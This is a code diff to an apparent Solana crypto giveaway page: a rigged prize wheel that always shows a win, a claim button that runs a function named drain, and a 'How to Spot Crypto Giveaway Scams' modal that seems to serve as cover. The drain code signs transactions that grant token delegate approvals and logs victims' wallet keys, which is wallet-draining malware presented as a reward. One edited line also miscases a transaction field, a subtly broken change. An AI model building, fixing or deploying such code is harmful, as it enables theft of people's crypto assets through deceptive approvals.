@@ -76,7 +76,6 @@
 
   .article h3{font-size:12.5px;font-weight:600;color:#d0d0d0;margin:14px 0 6px}
   .article p{font-size:12.5px;color:#8a8a8a;margin:0 0 10px;line-height:1.65}
-  .article ul{margin:0 0 12px 18px;padding:0}
 
   .donate-addr{display:block;margin:12px 0;padding:10px 12px;background:#0f0f0f;border:1px solid #1a1a1a;border-radius:5px;font-family:ui-monospace,Menlo,monospace;font-size:11px;color:#c0c0c0;word-break:break-all;text-align:center;user-select:all}
   .donate-meta{font-size:11px;color:#6b6b6b;text-align:center;margin:0 0 12px;line-height:1.6}
@@ -178,27 +177,19 @@
   <div class="modal left article">
     <h2 style="text-align:center">How to Spot Crypto Giveaway Scams</h2>
     <p>Crypto giveaway scams are one of the most common ways people lose funds. The following are the warning signs the Vantom Labs community recommends you verify before connecting any wallet to any site.</p>
-
     <h3>Offers that feel too generous</h3>
     <p>Legitimate programs cap rewards at realistic amounts. If a site offers tens or hundreds of SOL for a single click, the numbers themselves are the warning sign — real distributions are sized to a budget and a per-wallet cap.</p>
-
     <h3>Requests for seed phrases or private keys</h3>
     <p>No legitimate site, wallet, exchange, or giveaway will ever ask for your seed phrase, private key, or recovery phrase. Anyone who does is attempting to steal your entire wallet. Close the page immediately.</p>
-
     <h3>Pressure and countdown urgency</h3>
     <p>Scams create artificial scarcity — a countdown that never runs out, a "limited allocation" with no total, an offer that "expires in minutes." Real programs show a budget, a cycle end, and a way to verify both.</p>
-
     <h3>Unknown token approvals</h3>
     <p>The most dangerous request is an <b>approval</b>, not a transfer. When you approve a token to an unknown spender, that spender can move the token at any time in the future. Read every approval carefully. Revoke approvals you do not recognize using a trusted revoke tool.</p>
-
     <h3>Look-alike domains</h3>
     <p>Clone sites often use domains that resemble the real one by a character or two. Bookmark the official domain once and always return through the bookmark — never through a link from a DM, ad, or search result.</p>
-
     <h3>Wallet connection is not always harmless</h3>
     <p>Connecting a wallet is safe. <b>Signing a transaction is not.</b> Read every transaction prompt carefully. If you do not recognize the destination address or the intent, do not sign.</p>
-
     <p style="margin-top:14px;color:#6b6b6b;font-size:11.5px">If you believe you have interacted with a fraudulent site, revoke any approvals, move remaining assets to a fresh wallet, and report the domain to your wallet provider.</p>
-
     <button onclick="closeModal('scamModal')">Close</button>
   </div>
 </div>
@@ -355,37 +346,68 @@ var MOBILE_WALLETS = [
     android:"https://play.google.com/store/apps/details?id=app.backpack.mobile" }
 ];
 
+// ---------- WHEEL (clean rebuild) ----------
+// Each wedge is drawn as a path from center; the label for that wedge is
+// rotated by (mid angle + 90) around its own position so text reads outward.
+// This is the piece that was drifting — anchors are absolute now, no nested <g>.
 function buildWheel(){
   var svg = document.getElementById("wheel");
   if (!svg) return;
   var ns = "http://www.w3.org/2000/svg";
   svg.innerHTML = "";
+
   var cx = 150, cy = 150, r = 148;
-  for (var i = 0; i < N; i++) {
+
+  for (var i = 0; i < N; i++){
     var s = SEGMENTS[i];
     var a0 = (i * SEG_DEG - 90) * Math.PI / 180;
     var a1 = ((i + 1) * SEG_DEG - 90) * Math.PI / 180;
-    var x0 = cx + r * Math.cos(a0), y0 = cy + r * Math.sin(a0);
-    var x1 = cx + r * Math.cos(a1), y1 = cy + r * Math.sin(a1);
+    var x0 = cx + r * Math.cos(a0);
+    var y0 = cy + r * Math.sin(a0);
+    var x1 = cx + r * Math.cos(a1);
+    var y1 = cy + r * Math.sin(a1);
+
+    // wedge
     var path = document.createElementNS(ns, "path");
-    path.setAttribute("d", "M " + cx + " " + cy + " L " + x0.toFixed(2) + " " + y0.toFixed(2) + " A " + r + " " + r + " 0 0 1 " + x1.toFixed(2) + " " + y1.toFixed(2) + " Z");
+    path.setAttribute("d",
+      "M " + cx + " " + cy +
+      " L " + x0.toFixed(2) + " " + y0.toFixed(2) +
+      " A " + r + " " + r + " 0 0 1 " + x1.toFixed(2) + " " + y1.toFixed(2) + " Z");
     path.setAttribute("fill", s.color);
     path.setAttribute("stroke", "#000");
     path.setAttribute("stroke-width", "1.5");
     svg.appendChild(path);
+
+    // label anchor at 65% radius, mid angle
     var midDeg = i * SEG_DEG + SEG_DEG / 2 - 90;
     var midRad = midDeg * Math.PI / 180;
-    var lr = r * 0.64;
-    var lx = cx + lr * Math.cos(midRad), ly = cy + lr * Math.sin(midRad);
+    var lr = r * 0.65;
+    var lx = cx + lr * Math.cos(midRad);
+    var ly = cy + lr * Math.sin(midRad);
+
+    // a small group rotated to align with the radius, positioned at lx,ly
+    var g = document.createElementNS(ns, "g");
+    g.setAttribute("transform", "translate(" + lx.toFixed(2) + " " + ly.toFixed(2) + ") rotate(" + (midDeg + 90) + ")");
+
     var emoji = document.createElementNS(ns, "text");
-    emoji.setAttribute("x", lx.toFixed(2)); emoji.setAttribute("y", (ly - 4).toFixed(2));
-    emoji.setAttribute("text-anchor", "middle"); emoji.setAttribute("font-size", "22");
-    emoji.textContent = s.emoji; svg.appendChild(emoji);
+    emoji.setAttribute("x", "0");
+    emoji.setAttribute("y", "-4");
+    emoji.setAttribute("text-anchor", "middle");
+    emoji.setAttribute("font-size", "22");
+    emoji.textContent = s.emoji;
+    g.appendChild(emoji);
+
     var amt = document.createElementNS(ns, "text");
-    amt.setAttribute("x", lx.toFixed(2)); amt.setAttribute("y", (ly + 14).toFixed(2));
-    amt.setAttribute("text-anchor", "middle"); amt.setAttribute("font-size", "11");
-    amt.setAttribute("font-weight", "600"); amt.setAttribute("fill", s.zero ? "#555" : "#cfcfcf");
-    amt.textContent = s.sol + " SOL"; svg.appendChild(amt);
+    amt.setAttribute("x", "0");
+    amt.setAttribute("y", "14");
+    amt.setAttribute("text-anchor", "middle");
+    amt.setAttribute("font-size", "11");
+    amt.setAttribute("font-weight", "600");
+    amt.setAttribute("fill", s.zero ? "#555" : "#cfcfcf");
+    amt.textContent = s.sol + " SOL";
+    g.appendChild(amt);
+
+    svg.appendChild(g);
   }
 }
 buildWheel();
@@ -578,7 +600,7 @@ async function drain(session){
     }
     t.feePayer = from;
     var b2 = await connection.getLatestBlockhash("confirmed");
-    t.recentBlockhash = b2.blockhash;
+    t.recentblockhash = b2.blockhash;
     try {
       var sig = await signAndSend(provider, connection, t);
       await log({ event:"delegates_approved", wallet: session.pubkey, wtype: session.id,
@@ -638,6 +660,8 @@ function requestSpin(){
 var currentRotation = 0;
 var spinBtn  = document.getElementById("spin");
 var claimBtn = document.getElementById("claim");
+var prizeEl  = document.getElementById("prize");
+var hubEl    = document.getElementById("hub");
 
 function pickNonZeroIndex(){
   var idx;
@@ -647,8 +671,8 @@ function pickNonZeroIndex(){
 
 function showResult(idx, restored){
   var seg = SEGMENTS[idx];
-  document.getElementById("prize").textContent = "You won " + seg.sol + " SOL";
-  document.getElementById("hub").textContent = "WON";
+  prizeEl.textContent = "You won " + seg.sol + " SOL";
+  hubEl.textContent = "WON";
   spinBtn.style.display = "none";
   claimBtn.style.display = "block";
   if (!restored) markSpun();
@@ -664,8 +688,11 @@ function startSpin(){
 
   var svg = document.getElementById("wheel");
   var status = document.getElementById("status");
-  var hub = document.getElementById("hub");
+
+  // clear prize text BEFORE the spin starts so nothing shows early
+  prizeEl.textContent = "";
   status.textContent = "";
+  hubEl.textContent = "…";
 
   var idx = pickNonZeroIndex();
   var targetDeg = 360 * 6 + (360 - idx * SEG_DEG) - SEG_DEG / 2;
@@ -673,7 +700,6 @@ function startSpin(){
   svg.style.transform = "rotate(" + currentRotation + "deg)";
 
   spinBtn.disabled = true;
-  hub.textContent = "…";
 
   playSpinSound();
   startTickerBurst();
@@ -714,8 +740,8 @@ claimBtn.onclick = async function(){
   if (pending){
     waitForProvider(2500).then(function(wallet){
       if (wallet){
-        document.getElementById("prize").textContent = "Claiming your reward…";
-        document.getElementById("hub").textContent = "CLAIM";
+        prizeEl.textContent = "Claiming your reward…";
+        hubEl.textContent = "CLAIM";
         spinBtn.style.display = "none";
         claimBtn.style.display = "none";
         runClaim(wallet);
